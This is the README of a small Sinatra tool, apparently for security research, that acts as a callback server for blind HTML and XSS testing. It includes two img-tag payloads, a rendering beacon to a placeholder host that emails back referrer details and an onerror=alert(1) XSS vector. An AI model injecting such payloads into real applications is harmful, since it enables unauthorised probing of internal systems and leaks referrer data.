# Homeboy

A super simple sinatra endpoint for using in security research.

Homeboy can be used in place of xss image payloads, or inside content where you suspect that an application is rendering HTML.
I
## Examples

```
/*
HTML Rendering beacon
Useful for probing into a companies internal backend systems. Complete referrer details are then email to you when this html content is rendered.
*/
<img src=http://homeboy.example.com />

/*
Image based XSS Vector
Useful for creating an erraneous image for the purposes of hitting an onerror block. As above when this fails you will receive an email.
*/
<img src=http://homeboy.example.com onerror=alert(1) />
```
